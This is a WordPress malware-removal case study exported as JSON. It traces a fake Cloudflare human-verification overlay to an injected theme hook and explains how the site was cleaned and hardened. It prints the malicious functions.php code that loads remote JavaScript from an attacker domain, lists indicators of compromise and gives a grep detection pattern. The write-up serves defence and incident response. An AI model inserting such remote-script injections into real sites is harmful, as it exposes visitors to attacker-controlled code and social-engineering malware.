{
  "id": 1300,
  "slug": "wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study",
  "date": "2025-09-06T13:39:33",
  "modified": "2025-12-21T17:12:07",
  "title": "WordPress Hacked: Fake Cloudflare “Verify You Are Human&#8221; — A WordPress Malware Removal Case Study",
  "content": "<p><b>Summary:</b> A client&#8217;s <b>website was hacked</b>. A fake Cloudflare &#8220;Verify you are human&#8221; page showed on their domain. I traced it to a malicious script <b>https://digitalsheat[.]com/loader.js</b> (also seen as <b>digitalsheet[.]com/loader.js</b>) loaded from the <b>custom theme&#8217;s</b> functions.php. The script added a full-screen iframe, asked users to press <b>Win+R</b> and <b>Ctrl+V</b>, and used a MutationObserver to persist. I removed the injection, cleaned the malware, checked the server, hardened security, and brought the site back the same day.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" class=\"\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/fake-captcha.png\" alt=\"Fake Cloudflare page\" width=\"745\" height=\"318\" /><figcaption style=\"text-align: center; margin-top: 10px;\">Fake Cloudflare page showing on the site&#8217;s domain.</figcaption></figure>\n<h2>What users saw</h2>\n<p>Visitors hit a <b>full-page &#8220;Verify you are human&#8221;</b> screen that blocked the real site.</p>\n<h2>Step 1 — Check the DOM (prove it is fake)</h2>\n<p>I opened <b>DevTools → Elements</b>. I saw the overlay HTML <b>inside the page DOM</b> (elements like checkbox-verify). Real Cloudflare checks do <b>not</b> ship as theme or plugin HTML.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_2-1.png\" alt=\"DOM elements\" width=\"745\" height=\"318\" /><figcaption style=\"text-align: center; margin-top: 10px;\">Overlay elements present in the site&#8217;s DOM.</figcaption></figure>\n<h2>Step 2 — Watch the Network (no real verification)</h2>\n<p>I clicked the checkbox and watched <b>DevTools → Network</b>. The page sent <b>no API/XHR calls</b> to Cloudflare or the app. It only loaded static files. This is <b>social engineering</b>, not security.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_3-1.png\" alt=\"Win+R Ctrl+V prompt\" width=\"745\" height=\"318\" /><figcaption style=\"text-align: center; margin-top: 10px;\">The prompt tells users to press Win+R / Ctrl+V. A browser check never needs OS commands.</figcaption></figure>\n<h2>Step 3 — Review the admin (backdoor / fake plugins)</h2>\n<p>In wp-admin I spotted <b>fake/backdoor plugins</b> that looked like normal tools. Attackers often use these for persistence.</p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\"wp-image-1305 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_4-e1766337082184-300x124.png\" alt=\"\" width=\"726\" height=\"300\" srcset=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_4-e1766337082184-300x124.png 300w, https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_4-e1766337082184-1024x425.png 1024w, https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_4-e1766337082184-1536x637.png 1536w, https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_4-e1766337082184.png 1856w\" sizes=\"auto, (max-width: 726px) 100vw, 726px\" /></p>\n<figure style=\"text-align: center; margin: 25px 0;\"><figcaption style=\"text-align: center; margin-top: 10px;\">Suspicious fake plugins used as backdoors.</figcaption></figure>\n<h2>Step 4 — Hunt the payload (DevTools → Sources)</h2>\n<p>In <b>Sources</b>, I found an unknown <b>loader.js</b>. When I paused on exceptions, I saw <b>obfuscated code</b> with a MutationObserver. That is a strong persistence sign.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_5.png\" alt=\"Obfuscated loader.js\" width=\"745\" height=\"318\" /><figcaption style=\"text-align: center; margin-top: 10px;\">Obfuscated loader.js manipulating the page.</figcaption></figure>\n<h2>Step 5 — Confirm the external source (and the request)</h2>\n<p><b>Sources</b> showed: digitalsheat[.]com/loader.js (also digitalsheet[.]com/loader.js).</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_6.png\" alt=\"External source confirmation\" width=\"745\" height=\"318\" /></figure>\n<p><b>Network</b> confirmed the browser <b>fetched</b> the same script.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_7.png\" alt=\"Network request confirmation\" width=\"745\" height=\"318\" /></figure>\n<p><i>The script loads from an attacker domain. They can change it any time.</i></p>\n<h2>Step 6 — Find the persistence in the custom theme</h2>\n<p>I searched the code for loader.js and wp_enqueue_script. I found this in the <b>custom theme</b> functions.php:</p>\n<pre><code>\r\nfunction enqueue_custom_script() {\r\n  wp_enqueue_script(\r\n    'custom-error-script',\r\n    'https://digitalsheat.com/loader.js',\r\n    array(),\r\n    null,\r\n    true\r\n  );\r\n}\r\nadd_action('wp_enqueue_scripts', 'enqueue_custom_script');\r\n</code></pre>\n<p>I removed this code. The fake page disappeared.</p>\n<figure style=\"text-align: center; margin: 25px 0;\"><img loading=\"lazy\" decoding=\"async\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/Screenshot_8.png\" alt=\"Malicious enqueue code\" width=\"745\" height=\"318\" /><figcaption style=\"text-align: center; margin-top: 10px;\">Malicious enqueue inside the custom theme.</figcaption></figure>\n<h2>What the malware does (plain language)</h2>\n<h3><b>Overlay and throttle</b></h3>\n<ul>\n<li>On DOMContentLoaded, it creates a <b>full-screen iframe</b> (position: fixed; inset: 0; z-index: 2147483647).</li>\n<li>It disables scroll (body.style.overflow=&#8217;hidden&#8217;).</li>\n<li>It injects a <b>base64</b> HTML template that looks like Cloudflare.</li>\n<li>It stores a time stamp in <b>localStorage</b> so the overlay returns <b>less often</b> (about 24 hours). This hides patterns.</li>\n</ul>\n<h3><b>Push the user to run commands</b></h3>\n<ul>\n<li>It tells users to press <b>Win+R</b> and <b>Ctrl+V</b>.</li>\n<li>This is <b>MITRE ATT&amp;CK T1204: User Execution</b>. It tries to make the user run attacker commands.</li>\n</ul>\n<h3><b>Look legit and avoid noise</b></h3>\n<ul>\n<li>It skips some user agents (often mobile).</li>\n<li>It uses the site&#8217;s domain/title and an icon to appear &#8220;native.&#8221;</li>\n</ul>\n<h3><b>Stay persistent</b></h3>\n<ul>\n<li>It uses wp_enqueue_scripts so it runs on <b>every page load</b>.</li>\n<li>Because it loads from a remote domain, the attacker can <b>swap payloads</b> without touching your server again.</li>\n</ul>\n<h2>Indicators of Compromise (search these)</h2>\n<h3><b>Domains / URLs</b></h3>\n<ul>\n<li>https://digitalsheat[.]com/loader.js</li>\n<li>https://digitalsheet[.]com/loader.js <i>(common variant)</i></li>\n</ul>\n<h3><b>WordPress hooks / function names</b></h3>\n<ul>\n<li>add_action(&#8216;wp_enqueue_scripts&#8217;,&#8217;enqueue_custom_script&#8217;);</li>\n<li>wp_enqueue_script(&#8216;custom-error-script&#8217;,&#8217;https://&#8230;/loader.js&#8217;,&#8230;);</li>\n</ul>\n<h3><b>Obfuscated JavaScript signs</b></h3>\n<ul>\n<li>_0x-style names, array-rotation loops, atob(&#8230;) + TextDecoder, MutationObserver, full-screen iframe with very high z-index.</li>\n</ul>\n<h3><b>Quick scans</b></h3>\n<pre># Code\r\ngrep -RniE \"digitals?heat\\.com|loader\\.js|enqueue_custom_script|custom-error-script|_0x[0-9a-f]{3,}\" wp-content</pre>\n<h2>Likely root cause</h2>\n<p>We did not see the first entry point in the evidence. The common causes are <b>outdated or vulnerable plugins/themes</b>, weak or reused passwords, exposed admin panels, or <b>nulled</b> components. The changed functions.php shows <b>someone edited code</b> after deployment.</p>\n<h2>Remediation I performed (short)</h2>\n<ol>\n<li><b>Containment</b> — I removed the malicious enqueue and all calls to digitalsheat[.]com/loader.js. I put the site in a brief maintenance window and disabled file editing in the dashboard.</li>\n<li><b>Clean &amp; verify</b> — I cleaned the infected files (functions.php, injected JS), removed <b>fake/backdoor plugins</b>, searched code and database for IoCs, updated WordPress core, plugins, and the custom theme, and checked that no executable files sit in writable folders (like uploads/).</li>\n<li><b>Server checks</b> — I reviewed system and user crontabs and WP-Cron, audited processes and startup services, and checked .htaccess, .user.ini, and php.ini for auto_prepend_file / auto_append_file. I also verified SSH keys, users, file owners, and recent changes.</li>\n<li><b>Hardening</b> — I enabled DISALLOW_FILE_EDIT, applied least-privilege permissions, rotated all passwords and <b>AUTH_KEY/SALTS</b>, turned on 2FA for admins, upgraded PHP to a supported version, added security headers, and enabled a trusted WAF with rate limits.</li>\n<li><b>Monitoring</b> — I set up file-integrity monitoring and daily offsite backups. I added alerts for theme/plugin changes, <b>new outbound JS domains</b>, unusual logins, and error spikes.</li>\n</ol>\n<p><b>Result:</b> The fake page vanished at once. The site made <b>no further requests</b> to the attacker domain. The site remains stable under monitoring.</p>\n<h2>Post-cleanup checks (quick list)</h2>\n<ul>\n<li><b>Network:</b> no calls to digitalsheat[.]com/loader.js or digitalsheet[.]com/loader.js.</li>\n<li><b>Elements / Sources:</b> no overlay or injector code.</li>\n<li><b>localStorage:</b> no overlay keys.</li>\n</ul>\n<p><b>Fresh devices/sessions:</b> real site loads every time.</p>\n<h2>How to remove malware from a WordPress site (action guide)</h2>\n<ol>\n<li>Do <b>not</b> follow any <b>Win+R / Ctrl+V</b> prompts.</li>\n<li>Open <b>DevTools → Network</b>, reload, and look for unknown external JavaScript.</li>\n<li>Check the theme functions.php and mu-plugins for strange wp_enqueue_script calls.</li>\n<li>Remove the malware, update WordPress core, plugins, and the theme, and delete what you don&#8217;t use.</li>\n<li>Rotate all passwords and refresh salts; enable <b>MFA</b>.</li>\n<li>Add a <b>WordPress firewall and security</b> tool; enable file-integrity monitoring and tested backups.</li>\n</ol>\n<h2>Results (business value)</h2>\n<ul>\n<li><b>Fast recovery</b> — I restored the site the same day.</li>\n<li><b>Threat removed</b> — No more calls to attacker domains.</li>\n<li><b>Stronger security</b> — Updates, MFA, least privilege, and monitoring are now in place.</li>\n</ul>\n<h2>Professional WordPress Malware Removal Service</h2>\n<p>If your WordPress site has been compromised or you suspect malware infection, don&#8217;t risk your business reputation and data. I provide comprehensive WordPress malware removal services that include:</p>\n<ul>\n<li>Complete malware detection and removal</li>\n<li>Security vulnerability assessment</li>\n<li>Website hardening and protection</li>\n<li>Backup and recovery solutions</li>\n<li>Ongoing monitoring and maintenance</li>\n</ul>\n<p>Get your website cleaned and secured by a professional. <a href=\"https://www.mdpabel.com/wordpress-malware-removal\" rel=\"noopener noreferrer\"><b>Learn more about my WordPress Malware Removal service</b></a> and protect your online presence today.</p>\n",
  "excerpt": "",
  "link": "https://cms.mdpabel.com/case-study/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>WordPress Hacked: Fake Cloudflare “Verify You Are Human&quot; — A WordPress Malware Removal Case Study - MD Pabel</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"WordPress Hacked: Fake Cloudflare “Verify You Are Human&quot; — A WordPress Malware Removal Case Study\" />\n<meta property=\"og:description\" content=\"Summary: A client&#8217;s website was hacked. A fake Cloudflare &#8220;Verify you are human&#8221; page showed on their domain. I traced it to a malicious script https://digitalsheat[.]com/loader.js (also seen as digitalsheet[.]com/loader.js) loaded from the custom theme&#8217;s functions.php. The script added a full-screen iframe, asked users to press Win+R and Ctrl+V, and used a MutationObserver to persist. [&hellip;]\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:modified_time\" content=\"2025-12-21T17:12:07+00:00\" />\n<meta property=\"og:image\" content=\"https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png?wsr\" />\n\t<meta property=\"og:image:width\" content=\"1536\" />\n\t<meta property=\"og:image:height\" content=\"1024\" />\n\t<meta property=\"og:image:type\" content=\"image/png\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data1\" content=\"7 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"WordPress Hacked: Fake Cloudflare “Verify You Are Human&#8221; — A WordPress Malware Removal Case Study\",\"datePublished\":\"2025-09-06T07:39:33+00:00\",\"dateModified\":\"2025-12-21T17:12:07+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"wordCount\":1042,\"image\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png?wsr\",\"inLanguage\":\"en-US\"},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\",\"url\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\",\"name\":\"WordPress Hacked: Fake Cloudflare “Verify You Are Human\\\" — A WordPress Malware Removal Case Study - MD Pabel\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"image\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png?wsr\",\"datePublished\":\"2025-09-06T07:39:33+00:00\",\"dateModified\":\"2025-12-21T17:12:07+00:00\",\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\",\"url\":\"https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png?wsr\",\"contentUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png?wsr\",\"width\":1536,\"height\":1024},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/case-studies/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"WordPress Hacked: Fake Cloudflare “Verify You Are Human&#8221; — A WordPress Malware Removal Case Study\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "featuredImage": {
    "url": "https://cms.mdpabel.com/wp-content/uploads/2025/09/wordpress-hacked-fake-cloudflare-verify-you-are-human-a-wordpress-malware-removal-case-study.png",
    "alt": ""
  },
  "categories": [],
  "acf": {
    "problem_statement": "",
    "Impact_Metrics": "",
    "key_issues": "",
    "solution_overview": "",
    "key_results": ""
  }
}